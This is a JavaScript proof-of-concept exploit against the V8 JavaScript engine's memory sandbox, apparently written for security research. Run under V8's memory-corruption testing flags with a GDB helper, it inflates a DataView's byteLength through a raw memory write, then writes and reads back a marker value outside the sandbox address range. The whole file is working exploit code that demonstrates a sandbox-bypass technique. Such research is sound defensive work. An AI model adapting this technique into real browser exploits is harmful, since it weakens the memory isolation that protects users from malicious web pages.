'use strict';
// GDB-assisted out-of-sandbox write PoC
// Run via: heap_escape_gdb.sh (which injects mmap at SB_END via GDB)

function hex(v) {
  if (typeof v === 'bigint') return '0x' + v.toString(16).padStart(12, '0');
  return '0x' + (v >>> 0).toString(16).padStart(8, '0');
}
function banner(s) { print('\n━━━ ' + s + ' ━━━'); }

if (typeof Sandbox === 'undefined') {
  print('[-] Need: --expose-memory-corruption-api --allow-natives-syntax'); quit(1);
}

// Stage 1: in-sandbox 4GB R/W primitive
const sv    = new DataView(new Sandbox.MemoryView(0, 0x100000000));
const r32   = a => sv.getUint32(Number(a), true);
const w32   = (a, v) => sv.setUint32(Number(a), v >>> 0, true);
const SB_BASE = BigInt(Sandbox.base);
const SB_END  = SB_BASE + BigInt(Sandbox.byteLength);
const SB_SIZE = Sandbox.byteLength;

banner('SANDBOX VA');
print('  SB_BASE = ' + hex(SB_BASE));
print('  SB_END  = ' + hex(SB_END));

// Stage 2: MemoryView backed at SB_END - 4GB
banner('STAGE 2');
const NEAR_END_OFFSET = SB_SIZE - 0x100000000;
const mv_end    = new Sandbox.MemoryView(NEAR_END_OFFSET, 0x100000000);
const mv_end_dv = new DataView(mv_end);
const mvDvAddr  = BigInt(Sandbox.getAddressOf(mv_end_dv));
print('  MemoryView(SB_SIZE-4GB, 4GB) created OK');
print('  DataView sb_off = ' + hex(mvDvAddr));

// Stage 3: inflate DataView.byteLength to ~32GB
banner('STAGE 3 — inflate');
w32(mvDvAddr + 0x24n, 0xFFFFFFFF);
const bl = mv_end_dv.byteLength;
print('  DataView.byteLength = ' + bl + ' (' + hex(BigInt(bl)) + ')');
if (bl < 0x400000000) { print('[-] Inflation failed'); quit(1); }
print('  Inflation ✓');

// Signal external GDB to inject mmap at SB_END
// Format: INJECT:<pid>:<SB_END_hex>
const ESCAPE_OFFSET = 0x100000004;  // 4GB + 4 → target = SB_END + 4
const target = SB_END + 4n;
print('');
print('INJECT:' + SB_END.toString(16));
print('  Target address: ' + hex(target) + '  (SB_END + 4)');
print('  Spinning 20s — GDB must map page at SB_END before timeout...');

// Spin 20 seconds for GDB injection
const deadline = Date.now() + 20000;
while (Date.now() < deadline) {}

// Stage 4: OOB write outside sandbox VA
banner('STAGE 4 — OOB write');
print('  Writing 0xDEADC0DE to offset ' + hex(BigInt(ESCAPE_OFFSET)) + ' (= SB_END + 4)');
mv_end_dv.setUint32(ESCAPE_OFFSET, 0xDEADC0DE, true);
print('  Write completed without crash ✓');

// Stage 5: read back to confirm
banner('STAGE 5 — read back');
const readback = mv_end_dv.getUint32(ESCAPE_OFFSET, true);
print('  Read back value: ' + hex(readback));
if (readback === 0xDEADC0DE) {
  print('  ✓ READ/WRITE OUTSIDE SANDBOX VA CONFIRMED');
  print('  Address: ' + hex(target) + ' outside [' + hex(SB_BASE) + ', ' + hex(SB_END) + ')');
} else {
  print('  ✗ Unexpected value — mmap injection may have failed');
}
